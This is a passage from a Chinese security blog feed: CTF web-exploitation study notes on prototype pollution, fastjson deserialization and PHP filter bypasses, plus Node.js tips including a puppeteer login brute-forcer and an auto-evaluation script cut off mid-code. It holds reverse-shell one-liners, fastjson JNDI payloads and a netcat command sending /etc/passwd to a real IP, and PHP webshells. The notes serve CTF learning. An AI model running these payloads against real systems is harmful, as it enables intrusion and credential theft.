href="#骚操作-preventExtensions绕过" class="headerlink" title="骚操作-preventExtensions绕过"></a>骚操作-preventExtensions绕过</h2><p><img src="http://static.zybuluo.com/1160307775/rlrzawswdkm43aim2nqvqfyj/image_1drfesanc17521a6ipu112avoua9.png" alt="image_1drfesanc17521a6ipu112avoua9.png-159.7kB"></p><h2 id="Javascript原型链知识"><a href="#Javascript原型链知识" class="headerlink" title="Javascript原型链知识"></a>Javascript原型链知识</h2><p>实例对象的 __proto__与创建该实例对象的构造函数的 prototype 是相等的</p><pre><code>function Cat() {    this.color = &#39;orange&#39;}var cat = new Cat()console.log(cat.__proto__ === Cat.prototype)   // true</code></pre><p><img src="http://static.zybuluo.com/1160307775/49tkdxytis065nq33e4ah64d/image_1dma6rinf3k4lvv13cfj0l15fo9.png" alt="image_1dma6rinf3k4lvv13cfj0l15fo9.png-53.4kB"></p><p>在 JavaScript 中，如果想访问某个属性，首先会在实例对象（cat）的内部寻找，如果没找到，就会在该对象的原型（cat.__proto__，即 Cat.prototype）上找，我们知道，对象的原型也是对象，它也有原型，如果在对象的原型上也没有找到目标属性，则会在对象的原型的原型（Cat.prototype.__proto__）上寻找，以此内推，直到找到这个属性或者到达了最顶层。在原型上一层一层寻找，这便就是原型链了。</p><p>实例对象原型的原型是Object.prototype，而它的原型是null，null 没有原型，所以 Object.prototype 就是原型链的最顶端。</p><h3 id="constructor-构造函数"><a href="#constructor-构造函数" class="headerlink" title="constructor-构造函数"></a>constructor-构造函数</h3><p>javascript需要有一个像经典语言那样的能够创建对象模板的方法，可以根据模板自动化的创建我们需要的对象。JavaScript 用一种称为构建函数的特殊函数来定义对象和它们的特征。构建函数提供了创建您所需对象（实例）的有效方法，将对象的数据和特征函数按需联结至相应对象</p><p>一个例子如下：</p><pre><code>function Person(name) {  this.name = name;  this.greeting = function() {    alert(&#39;Hi! I\&#39;m &#39; + this.name + &#39;.&#39;);  };}</code></pre><p>这个构建函数是 JavaScript 版本的类，这里使用了this关键词，指向这个构建函数创建的示例自身，而非指向构建函数(这跟其他面向对象语言中的this的含义一样)</p><p><strong>一个构建函数通常是大写字母开头，这样便于区分构建函数和普通函数</strong></p><p>每一个数据类型都有一个属性叫做<code>constructor</code>，指的就是自身的构造函数</p><p><img src="http://static.zybuluo.com/1160307775/vwwtw14kpni8i6mel7knng1w/image_1dtbe0q5qtkp1rldgr413l11a159.png" alt="image_1dtbe0q5qtkp1rldgr413l11a159.png-10.3kB">。</p><h3 id="prototype-原型"><a href="#prototype-原型" class="headerlink" title="prototype-原型"></a>prototype-原型</h3><p>可以把<code>prototype</code>看作<strong>类/方法/各种原始数据类型</strong>(这里统称为A)中的一个<strong>属性(画重点)</strong>，而所有用<strong>A类/方法/各种原始数据类型</strong>，得到的实例化的对象，都将拥有这个属性(prototype)中的所有内容</p><p>对于Object/Arrary/Function这三类数据类型来说，都有自己最原始的prototype。</p><p><img src="http://static.zybuluo.com/1160307775/nf076lg3f4rk6w8ugfbfozid/image_1dtbcvmil4nv6me1ndtgo21miap.png" alt="image_1dtbcvmil4nv6me1ndtgo21miap.png-709.6kB"></p><p>而所有的数据类型，最终的原型(prototype)都是Object.prototype，你也可以理解为数组/函数/xxx/这些数据类型都继承自类的原型，类是爸爸级别的。</p><pre><code>Array/Function.prototype.__proto__ == Object.prototype&gt;true</code></pre><h3 id="proto"><a href="#proto" class="headerlink" title="proto"></a>proto</h3><p>这个就很简单了，每个数据类型里都有一个<code>__proto__</code>属性，指向自己的原型<code>prototype</code></p><h2 id="污染思路"><a href="#污染思路" class="headerlink" title="污染思路"></a>污染思路</h2><p>大部分原型链污染的题目就是利用某个对象的__proto__去向上指定原型，一直找到<code>Object</code>，一旦可以污染到<code>Object</code>的xxx属性，就可以修改任何对象的xxx属性。</p><p>如果是一个已经被定义的变量，它无法被原型链污染。</p><p>这里举一个Array.prototype被污染的情况如下：<br><img src="http://static.zybuluo.com/1160307775/mbmemb110lhvmtd9gh6kxe8f/image_1dma76hhhtag18hj2ku1s43st3m.png" alt="image_1dma76hhhtag18hj2ku1s43st3m.png-28.6kB"></p><h3 id="loadsh库-lt-4-17-5的污染"><a href="#loadsh库-lt-4-17-5的污染" class="headerlink" title="loadsh库&lt;4.17.5的污染"></a>loadsh库&lt;4.17.5的污染</h3><p>payload如下</p><pre><code>const mergeFn = require(&#39;lodash&#39;).defaultsDeep;const payload = &#39;{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;a0&quot;: true}}}&#39;function check() {    mergeFn({}, JSON.parse(payload));    if (({})[&#39;a0&#39;] === true) {        console.log(`Vulnerable to Prototype Pollution via ${payload}`);    }  }check();</code></pre><p>这个payload就相当于污染了Object.prototype.a0属性<br><img src="http://static.zybuluo.com/1160307775/yw8yzubquiat16kuza8uso6s/image_1dtben43n1ab92ab1bml19k1hvlm.png" alt="image_1dtben43n1ab92ab1bml19k1hvlm.png-21.9kB"></p><h3 id="JQuery-extend"><a href="#JQuery-extend" class="headerlink" title="JQuery-$.extend()"></a>JQuery-$.extend()</h3><p>JQuery 是一个非常流行的Js前端工具库，而它也存在原型链污染漏洞，CVE：CVE-2019-11358， 版本小于3.4.0时</p><p><img src="http://static.zybuluo.com/1160307775/ey9p1cv9e48igzla24c4odu8/image_1dtbf900dc9g109k1iev8ebfm41j.png" alt="image_1dtbf900dc9g109k1iev8ebfm41j.png-11.6kB"></p><p>可以看到，<code>$.extend(true,{},JSON.parse(&#39;{&quot;__proto__&quot;:{&quot;aa&quot;:&quot;hello&quot;}}&#39;))</code> Jquery可以用$.extend将两个字典merge，而这也因此污染了原型链。</p><h3 id="ejs和jade的RCE"><a href="#ejs和jade的RCE" class="headerlink" title="ejs和jade的RCE"></a>ejs和jade的RCE</h3><p>都是在exports.compile，即编译模版时候产生的代码注入</p><p>以jade模版为例，首先通过parse()函数获取一个变量作为函数内容，之后呢把它赋值到fn中，通过建立一个构造方法<code>Function</code>把fn数组重新赋值为一个新的函数体<code>fn</code>，之后调用return fn来动态执行原来fn中的字符串(相当于一个编译过程)</p><p>所以只要fn中存在恶意代码就可以在创建构造函数的时候把代码执行了<br><img src="http://static.zybuluo.com/1160307775/hk916tks6fy0dqn1p88pm6ne/image_1dtbhnc4t1eju1pi875c16a3d5d20.png" alt="image_1dtbhnc4t1eju1pi875c16a3d5d20.png-217.7kB"></p><p>所以跟进parse找污染点。一步一步入栈，栈的最深处visit函数存在原型链污染点，line默认未定义，只要污染line为:<code>));global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;nc vps -e /bin/sh&#39;);//</code>即可</p><p><img src="http://static.zybuluo.com/1160307775/ncrd9wo2aqnra2b1jkn6swfn/image_1dtbhutuu7ug14iog7t12b6hh32t.png" alt="image_1dtbhutuu7ug14iog7t12b6hh32t.png-119.9kB"></p><p>关于ejs的RCE+污染点分析，见：</p><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/" target="_blank" rel="noopener">Express+lodash+ejs: 从原型链污染到RCE</a></p><p><a href="https://xz.aliyun.com/t/6113" target="_blank" rel="noopener">XNUCA2019 Hardjs题解 从原型链污染到RCE</a></p><h3 id="不需要原型链污染的ejs-rce"><a href="#不需要原型链污染的ejs-rce" class="headerlink" title="不需要原型链污染的ejs-rce"></a>不需要原型链污染的ejs-rce</h3><p>前提是将<code>req.body</code>作为ejs渲染的参数，因为express存在hpp，所以这样就相当于污染了<code>options</code>，从而污染一个<code>options.settings</code>，这样就不需要原型链。。不过一般没有那个sb会这样写ejs的渲染出了ctfer</p><p><img src="http://static.zybuluo.com/1160307775/t0d100moorci4vyxni1b1xyy/image_1dvm51g2cbdhepm121j1jl1eoj3p.png" alt="image_1dvm51g2cbdhepm121j1jl1eoj3p.png-15.4kB"></p><p>详情见国外的一道ctf：<a href="https://github.com/CykuTW/My-CTF-Challenges/tree/master/AIS3-EOF-CTF-2019-Quals/echo" target="_blank" rel="noopener">https://github.com/CykuTW/My-CTF-Challenges/tree/master/AIS3-EOF-CTF-2019-Quals/echo</a></p><h2 id="express框架"><a href="#express框架" class="headerlink" title="express框架"></a>express框架</h2><p>express框架存在hpp，也就是说传入这样的参数</p><pre><code>aa[name]=hpdoger</code></pre><p>会被解析成为对象<code>{aa:{name:&quot;hpdoger&quot;}}</code>，这是因为express原生处理请求使用的是qs模块，而qs模块不存在原型链污染的问题，所以不能污染_<em>proto_</em></p><h1 id="Javaweb"><a href="#Javaweb" class="headerlink" title="Javaweb"></a>Javaweb</h1><h2 id="反弹SHELL"><a href="#反弹SHELL" class="headerlink" title="反弹SHELL"></a>反弹SHELL</h2><p>Runtime.getRuntime().exec()是Java中执行系统命令的方法，该接口中不能使用管道符等bash需要的方法，需要对bash进行一次编码：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a>  </p><p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8888 0&gt;&amp;1  </p><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}</p><h2 id="fastjson攻击"><a href="#fastjson攻击" class="headerlink" title="fastjson攻击"></a>fastjson攻击</h2><p>看这个，原理分析的很到位:<a href="https://curz0n.github.io/2019/09/24/fastjson_1_2_61_blacklist_bypass/" target="_blank" rel="noopener">fastjson 1.2.61远程代码执行漏洞分析&amp;复现</a></p><p>具体的一个例子参见空指针wp:<a href="https://mp.weixin.qq.com/s?__biz=MzU4MTg1NzAzMA==&mid=2247483796&idx=1&sn=ce4249ba61d7f402a1211e508f83d2b4&chksm=fd407bfdca37f2ebd51202f8221d320ccd639fd48d6a2adcb53c17ccb143fc3f037e6198662a&mpshare=1&scene=23&srcid=&sharer_sharetime=1577970121763&sharer_shareid=b6a93c2ad862a6198898de9305c515e1#rd" target="_blank" rel="noopener">空指针-treasure-Writeup</a></p><h3 id="攻击的两种方式"><a href="#攻击的两种方式" class="headerlink" title="攻击的两种方式"></a>攻击的两种方式</h3><p><strong>1、jdk低版本，允许加载远程恶意类</strong></p><p>攻击者在服务端用<a href="https://github.com/mbechler/marshalsec/tree/0471b932a09c8aca21876de80c8abf65b251c9ca" target="_blank" rel="noopener">marshalsec</a>起一个rmi/ldap的server，用来接收受害者请求并且转发到我们自己构造的http服务，下载&amp;加载恶意类(用来RCE的类)，例子在:<a href="https://www.restran.net/2018/10/29/fastjson-rce-notes/" target="_blank" rel="noopener">FastJson 反序列化漏洞利用笔记</a></p><p>然后发送一个fastjson的poc到我们的rmi/ldap server就行了<br><a href="https://github.com/jas502n/fastjson-1.2.61-RCE" target="_blank" rel="noopener">fastjson-1.2.61-RCE</a></p><p><strong>2、jdk高版本，需要找到另外库的反序列化链来用</strong></p><p>188以后的版本，不允许加载远程的恶意类，也就是说请求不到我们http-server下面放置的恶意类。此时有两种方法:</p><p>1.用ldap+本地gadget来bypass:<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">如何绕过高版本JDK的限制进行JNDI注入利用</a></p><p>2.用jrmp+rmi来bypass:攻击者用yso本地建立一个rmi-server，然后利用其他依赖的反序列化中继，具体用法见:<a href="https://mp.weixin.qq.com/s?__biz=MzU4MTg1NzAzMA==&mid=2247483796&idx=1&sn=ce4249ba61d7f402a1211e508f83d2b4&chksm=fd407bfdca37f2ebd51202f8221d320ccd639fd48d6a2adcb53c17ccb143fc3f037e6198662a&mpshare=1&scene=23&srcid=&sharer_sharetime=1577970121763&sharer_shareid=b6a93c2ad862a6198898de9305c515e1#rd" target="_blank" rel="noopener">空指针-treasure-Writeup</a><br><img src="http://static.zybuluo.com/1160307775/ozohcfzy5fh830z7oa86dlzn/image_1dtl011jf1tdlnpnvd9jmg1nvh2p.png" alt="image_1dtl011jf1tdlnpnvd9jmg1nvh2p.png-24.7kB"></p><h3 id="挖洞利用"><a href="#挖洞利用" class="headerlink" title="挖洞利用"></a>挖洞利用</h3><p>遇到传输格式是json的，就可以本地nc监听一个端口<code>1389</code>看有没有收到请求，用poc去打一下，推荐用1.2.61的poc去打，这个比较接近于最新版</p><pre><code>{&quot;@type&quot;:&quot;org.apache.commons.configuration2.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://120.79.152.66:1389/ExportObject&quot;}{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://120.79.152.66:1389/Object&quot;,&quot;autoCommit&quot;:true}{&quot;@type&quot;:&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, &quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://120.79.152.66:1389/inject.sql&#39;&quot;}</code></pre><h1 id="NodeJS相关"><a href="#NodeJS相关" class="headerlink" title="NodeJS相关"></a>NodeJS相关</h1><h2 id="快速启动express框架"><a href="#快速启动express框架" class="headerlink" title="快速启动express框架"></a>快速启动express框架</h2><p>全局安装express<code>npm install express -gd</code></p><p>直接用<code>express project</code>就能启动项目</p><p><img src="http://static.zybuluo.com/1160307775/ztst1w1ee9pg18twtl3kok8o/image_1dus0g9591jm238q1tgd14cu2cl9.png" alt="image_1dus0g9591jm238q1tgd14cu2cl9.png-435.1kB"></p><h2 id="npm所有第三方库漏洞"><a href="#npm所有第三方库漏洞" class="headerlink" title="npm所有第三方库漏洞"></a>npm所有第三方库漏洞</h2><p><a href="https://snyk.io/vuln/?type=npm" target="_blank" rel="noopener">https://snyk.io/vuln/?type=npm</a></p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h3><pre><code>&gt; var test = &#39;hpdoger&#39;;&gt; var cookie = `aaa${test}`;&gt; console.log(cookie);aaahpdoger</code></pre><h2 id="url-parse绕过"><a href="#url-parse绕过" class="headerlink" title="url_parse绕过"></a>url_parse绕过</h2><p>对于白名单的绕过，又有新洞了，针对url_parse()函数:<a href="https://hackerone.com/reports/678487" target="_blank" rel="noopener">Hostname spoofing</a></p><h2 id="查看依赖的漏洞"><a href="#查看依赖的漏洞" class="headerlink" title="查看依赖的漏洞"></a>查看依赖的漏洞</h2><p>拿到一个nodejs项目的源码进行审计，第一步便是运行<code>npm audit</code> ，可以看到依赖项的漏洞情况。在项目的文件夹下直接运行<code>npm audit</code>就行了</p><p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567017506/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.33.58_k7scsn.png" alt></p><h2 id="RCE语句"><a href="#RCE语句" class="headerlink" title="RCE语句"></a>RCE语句</h2><pre><code>require(&#39;child_process&#39;).exec(&#39;cat+/etc/passwd+|+nc+120.79.152.66+80&#39;)</code></pre><h2 id="nodemon-node的debug模式"><a href="#nodemon-node的debug模式" class="headerlink" title="nodemon-node的debug模式"></a>nodemon-node的debug模式</h2><h1 id="综合题型"><a href="#综合题型" class="headerlink" title="综合题型"></a>综合题型</h1><h2 id="http请求走私"><a href="#http请求走私" class="headerlink" title="http请求走私"></a>http请求走私</h2><p><img src="http://static.zybuluo.com/1160307775/bdyqii5y4vomhk0zdpv847nf/image_1dr102gapo981svc1e4f1s7qo509.png" alt="image_1dr102gapo981svc1e4f1s7qo509.png-379.6kB"></p><h2 id="jwt攻击"><a href="#jwt攻击" class="headerlink" title="jwt攻击"></a>jwt攻击</h2><p><a href="https://xz.aliyun.com/t/6776#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776#toc-8</a></p><h2 id="python-rce"><a href="#python-rce" class="headerlink" title="python-rce"></a>python-rce</h2><pre><code>eval(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></pre><h2 id="MYSQL读取客户端文件"><a href="#MYSQL读取客户端文件" class="headerlink" title="MYSQL读取客户端文件"></a>MYSQL读取客户端文件</h2><p>如果对方能够连接任意mysql用户，我们就可以伪造一个server去读取客户端的文件</p><p>Rogue-MySql-Server:<a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server</a></p><p>1、有一个更智能的脚本:<a href="https://github.com/lcark/MysqlClientAttack" target="_blank" rel="noopener">https://github.com/lcark/MysqlClientAttack</a></p><p>2、针对ctf的脚本:<a href="https://github.com/ev0A/Mysqlist" target="_blank" rel="noopener">https://github.com/ev0A/Mysqlist</a></p><h2 id="进程文件proc"><a href="#进程文件proc" class="headerlink" title="进程文件proc"></a>进程文件proc</h2><p>proc是一个文件夹，每个进程都代表一个文件夹</p><h3 id="常见的进程文件"><a href="#常见的进程文件" class="headerlink" title="常见的进程文件"></a>常见的进程文件</h3><pre><code>/proc/self 链接到当前正在运行的进程/proc/N/cwd 链接到进程当前工作目录如果是通过小马执行的程序，那么当前进程就是apache，组合一下self/cwd:proc/self/cwd/     =&gt;apache的工作目录proc/pid/cmdline   =&gt;里面存储某个进程初始运行的命令,即启动时传递给kernel的参数信息</code></pre><h1 id="常见的过滤bypass"><a href="#常见的过滤bypass" class="headerlink" title="常见的过滤bypass"></a>常见的过滤bypass</h1><h2 id="php一句话"><a href="#php一句话" class="headerlink" title="php一句话"></a>php一句话</h2><h3 id="绕过尖括号"><a href="#绕过尖括号" class="headerlink" title="绕过尖括号"></a>绕过尖括号</h3><p>这种必须能修改.htaccess或者.user.ini文件，为每个文件包含一个php伪协议</p><p>利用方式:<a href="https://xz.aliyun.com/t/3937#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3937#toc-3</a></p><h3 id="绕过问号限制"><a href="#绕过问号限制" class="headerlink" title="绕过问号限制"></a>绕过问号限制</h3><p>php小于7.0的可以通过</p><pre><code>&lt;script language=&quot;PHP&quot;&gt;system($_GET[id])&lt;/script&gt;</code></pre><h3 id="绕过php标签限制"><a href="#绕过php标签限制" class="headerlink" title="绕过php标签限制"></a>绕过php标签限制</h3><p>或者使用短标签</p><pre><code>&lt;?=eval($_GET[1]);?&gt;</code></pre><h3 id="动态执行函数"><a href="#动态执行函数" class="headerlink" title="动态执行函数"></a>动态执行函数</h3><pre><code>1、没有过滤括号$_GET[1]($_GET[0]);2、过滤了括号的时候可以用大括号，但是php版本有要求，不过phpstudy没试出来$_GET{1}($_GET{0});</code></pre><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="异或getshell"><a href="#异或getshell" class="headerlink" title="异或getshell"></a>异或getshell</h3><p><a href="https://xz.aliyun.com/t/5677" target="_blank" rel="noopener">一道题回顾php异或webshell</a></p><h3 id="取反getshell"><a href="#取反getshell" class="headerlink" title="取反getshell"></a>取反getshell</h3><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a></p><p><img src="http://static.zybuluo.com/1160307775/79i3ts2ckb7pt2sadlxjxts0/image_1dn25ak6j4qopumrdjtv8mic9.png" alt="image_1dn25ak6j4qopumrdjtv8mic9.png-117.8kB"></p><p>生成规则:</p><pre><code>var_dump(urlencode(~&#39;phpinfo&#39;));=&gt;%8F%97%8F%96%91%99%90</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;My-CTF-Memo&quot;&gt;&lt;a href=&quot;#My-CTF-Memo&quot; class=&quot;headerlink&quot; title=&quot;My CTF Memo&quot;&gt;&lt;/a&gt;My CTF Memo&lt;/h1&gt;&lt;p&gt;自己比赛过程中使用的笔记，一些基础的知识点整理，如果自己还有机会打比
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Node的一些应用技巧(持续更新)</title>
    <link href="https://hpdoger.cn/2025/01/03/Node%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BA%94%E7%94%A8%E6%8A%80%E5%B7%A7(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/"/>
    <id>https://hpdoger.cn/2025/01/03/Node的一些应用技巧(持续更新)/</id>
    <published>2025-01-02T16:00:00.000Z</published>
    <updated>2020-01-21T06:33:52.615Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Node的一些应用技巧-持续更新"><a href="#Node的一些应用技巧-持续更新" class="headerlink" title="Node的一些应用技巧(持续更新)"></a>Node的一些应用技巧(持续更新)</h1><p>一边学一边记吧..一些能用的到的</p><h2 id="puppeteer模拟登陆"><a href="#puppeteer模拟登陆" class="headerlink" title="puppeteer模拟登陆"></a>puppeteer模拟登陆</h2><p>对于表单加密，可以简单的用Pupputeer来模拟登陆，遇到前端加密的情况直接爆破密码。同样能够模拟爬虫，比webdriver要省事的多，而且支持document.queryselector，完全模拟浏览器操作</p><pre><code>const puppeteer = require(&#39;puppeteer&#39;);async function autoLogin(url,username,password){    const browser = await puppeteer.launch({        args: [ &#39;--proxy-server=http://127.0.0.1:8080&#39; ],        headless: false    });    const page = await browser.newPage();    for(var i=0, len=password.length; i&lt;len; i++){        pwd = password[i];        await page.goto(url);        await page.waitForSelector(&#39;#login&#39;);        await page.type(&#39;#username&#39;, username,{ delay: 50 });        await page.type(&#39;#password&#39;, pwd,{ delay: 50 });        await page.click(&#39;#btn_click&#39;);        await page.waitFor(200);        let html = await page.content();        if(html.indexOf(&#39;wrong&#39;) &lt; 1){            break        }    }    // const tokenVal = await page.$eval(&#39;#token&#39;, input =&gt; input.value);    await browser.close();    // console.log(&quot;[*]got token is:&quot;+tokenVal);    page.on(&#39;error&#39;,(err)=&gt;{        console.log(err)    });}var username = &#39;admin&#39;;var password = [&#39;password&#39;,&#39;root&#39;,&#39;sa&#39;,&#39;admin&#39;,&#39;admin123&#39;]autoLogin(&#39;http://node.localhost.com/koa-demo/aes.html&#39;,username,password);</code></pre><h2 id="http发送请求"><a href="#http发送请求" class="headerlink" title="http发送请求"></a>http发送请求</h2><h3 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h3><p>对比python-request的优点在于不造成阻塞</p><pre><code>function getack(target){    return new Promise((resolve,reject)=&gt;{        let options = {            url: target,            headers: {                &#39;User-Agent&#39;: &#39;request&#39;            }        };        request.get(options, (error,response,body)=&gt;{            if (!error &amp;&amp; response.statusCode == 200) {                 resolve(body);            }else{                reject(error);            }        }).on(&#39;error&#39;, function(err) {            rehect(err);        });     })}var target = &#39;http://server.com&#39;;getack(target).then((body)=&gt;{    console.log(body);})</code></pre><h3 id="携带cookie请求"><a href="#携带cookie请求" class="headerlink" title="携带cookie请求"></a>携带cookie请求</h3><p>request默认不带cookie请求，需要启动jar，获取一个jar对象带入options中，同时对其进行setCookie操作</p><pre><code>const j = request.jar();const cookie1 = request.cookie(&#39;username=admin&#39;);const cookie2 = request.cookie(&#39;userid=123&#39;);j.setCookie(cookie1, target);j.setCookie(cookie2, target);let options = {    url: target,    jar:j,    headers: {        &#39;User-Agent&#39;: &#39;request&#39;    }};request.get(options, (error,response,body)=&gt;{    if (!error &amp;&amp; response.statusCode == 200) {         resolve(body);    }else{        reject(error);    }}).on(&#39;error&#39;, function(err) {    reject(err);}); </code></pre><h3 id="Response内置属性-方法"><a href="#Response内置属性-方法" class="headerlink" title="Response内置属性/方法"></a>Response内置属性/方法</h3><p>查看http.ServerResponse类属性和方法:<a href="http://nodejs.cn/api/http.html#http_class_http_serverresponse" target="_blank" rel="noopener">http://nodejs.cn/api/http.html#http_class_http_serverresponse</a></p><h2 id="HTTP-Server"><a href="#HTTP-Server" class="headerlink" title="HTTP-Server"></a>HTTP-Server</h2><h3 id="快速搭建"><a href="#快速搭建" class="headerlink" title="快速搭建"></a>快速搭建</h3><p>Nodejs提供了内置的http-api，用来作为Server很方便，console出来便于收藏poc</p><pre><code>//server.jsvar http=require(&quot;http&quot;);http.createServer(function(req,res){    res.writeHead(200,{        &quot;content-type&quot;:&quot;text/plain&quot;    });    res.write(&quot;hello world&quot;);    console.log(req.url)    res.end();}).listen(3000);console.log(&quot;[*]server run on:http://127.0.0.1:3000&quot;)</code></pre><h3 id="设置Cookie"><a href="#设置Cookie" class="headerlink" title="设置Cookie"></a>设置Cookie</h3><p><code>req.headers.cookie</code>获取请求头的cookie。node中原生http通过setHeader设置cookie，<code>response.setHeader(name, value)</code>方法接收key,value键值对。</p><pre><code>http.createServer(function(req,res){    username = &#39;admin&#39;    userid = 1    res.setHeader(&quot;Set-Cookie&quot;,[`username=${username}`,`userid=${userid}`]);    res.writeHead(200,{        &quot;content-type&quot;:&quot;text/plain&quot;    });    console.log(req.url);    res.end(&#39;hello world&#39;);}).listen(3000);</code></pre><p>当然也可以用JS-Cookie来操作cookie</p><h2 id="调试Express框架"><a href="#调试Express框架" class="headerlink" title="调试Express框架"></a>调试Express框架</h2><h3 id="调试已启动的Node程序"><a href="#调试已启动的Node程序" class="headerlink" title="调试已启动的Node程序"></a>调试已启动的Node程序</h3><p>在 launch.json 中作如下配置，VSCODE添加配置选项可自动添加</p><pre><code>{    // 使用 IntelliSense 了解相关属性。     // 悬停以查看现有属性的描述。    // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387    &quot;version&quot;: &quot;0.2.0&quot;,    &quot;configurations&quot;: [        {            &quot;type&quot;: &quot;node&quot;,            &quot;request&quot;: &quot;attach&quot;,            &quot;name&quot;: &quot;Attach by Process ID&quot;,            &quot;processId&quot;: &quot;${command:PickProcess}&quot;,            &quot;skipFiles&quot;: [                &quot;&lt;node_internals&gt;/**&quot;            ]        }    ]}</code></pre><p>启动调试之后会让你选择存在的进程号来指定调试程序<br><img src="http://static.zybuluo.com/1160307775/s15ml8tunt28esr8pao6rhfe/image_1dtsvrmsu4ij1hjp1abliqe1nh2m.png" alt="image_1dtsvrmsu4ij1hjp1abliqe1nh2m.png-116.6kB"></p><h3 id="断点位置"><a href="#断点位置" class="headerlink" title="断点位置"></a>断点位置</h3><p>Express基于中间键，调试的时候很难找到入口。如果你跟中间键的话，它在加载框架时要加载一堆的中间键(query、inint、session、cookie)这些的很复杂。所以建议直接把断点打在路由中间件<code>Route</code>的dispatch方法上，因为dispacth就是分发路由，转到对应的实现方法<br><img src="http://static.zybuluo.com/1160307775/pyj1xnf4na3lvkmf4nj84hk2/image_1dtses96u3m212l3rk713h615lr9.png" alt="image_1dtses96u3m212l3rk713h615lr9.png-359.5kB"></p><p>如果你想对中间键进行分析的话，建议把断点打在这里，因为只是进入中间键的第一步，fn是一个回调的函数<br><img src="http://static.zybuluo.com/1160307775/iz3ez5c6rlrlllaipylotxfq/image_1dtsfb8ds4ebel43qt60o1rk99.png" alt="image_1dtsfb8ds4ebel43qt60o1rk99.png-366.2kB"></p><h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><p>关于express中间键的加载以及路由的调度，<strong>强烈建议</strong>看这篇文章<a href="https://shadowwood.me/2016/08/27/2016-08-27-express-origin-code-analysis/" target="_blank" rel="noopener">express源码分析</a></p><h2 id="应用实例1-某信息工程大学全自动评教"><a href="#应用实例1-某信息工程大学全自动评教" class="headerlink" title="应用实例1-某信息工程大学全自动评教"></a>应用实例1-某信息工程大学全自动评教</h2><p>由于贵校老师实在太多了，闲来无事写了个自动评教(默认全好评)。之所以写了一个koa，是因为最初我想挂到机房，同学们拿着cookie在我web端傻瓜式自动评教了。后来我发现贵校的sso的session竟然验证了ip，代码放出来。</p><pre><code>const puppeteer = require(&#39;puppeteer&#39;);const Koa = require(&#39;koa&#39;);const router = require(&#39;koa-router&#39;);const bodyParser = require(&#39;koa-bodyparser&#39;);const app = new Koa()const home  = new router()async function autoFound(url,cookie){        const browser = await puppeteer.launch({            headless: false        });        const page = await browser.newPage();        page.on(&#39;dialog&#39;,(dialog)=&gt;{            console.log(dialog.message());            dialog.accept(&quot;确定&quot;);        });        page.on(&#39;error&#39;,(err)=&gt;{            console.log(err);        });        const cookies = [{            name: &#39;semester.id&#39;,            value: &#39;105&#39;,            domain: &#39;210.41.225.2&#39;            },{            name: &#39;JSESSIONID&#39;,            value: cookie,            domain: &#39;210.41.225.2&#39;            },{            name: &#39;GSESSIONID&#39;,            value: cookie,            domain: &#39;210.41.225.2&#39;            }];        await page.setCookie(...cookies);        await page.goto(url);        const result = await page.evaluate(() =&gt; {            var list = [...document.querySelectorAll(&#39;td &gt; a&#39;)]            return list.map(el =&gt; {                return {                url: el.href.trim(),                name: el.innerText                }            })        })        var answers = [&#39;老师真好，我很喜欢跟他相处&#39;,&#39;老师工作认真负责，课后问题及时讲解&#39;,&#39;在老师的课堂上学到很多知识&#39;];        for(var i=0, len=result.length;i&lt;len;i++){            let bufurl = result[i][&quot;url&quot;];            try{                await page.goto(bufurl);                await page.waitForSelector(&#39;.option-item&#39;);                await page.click(&quot;input[id=option_425_0]&quot;);                await page.click(&quot;input[id=option_426_0]&quot;);                await page.click(&quot;input[id=option_427_0]&quot;);                await page.click(&quot;input[id=option_428_0]&quot;);                await page.click(&quot;input[id=option_429_0]&quot;);                await page.click(&quot;input[id=option_430_0]&quot;);                await page.click(&quot;input[id=option_431_0]&quot;);                await page.click(&quot;input[id=option_432_0]&quot;);                await page.click(&quot;input[id=option_433_0]&quot;);                await page.click(&quot;input[id=option_434_0]&quot;);                await page.click(&quot;input[id=option_435_0]&quot;);                await page.click(&quot;input[id=option_436_0]&quot;);                await page.click(&quot;input[id=option_437_4]&quot;);                await 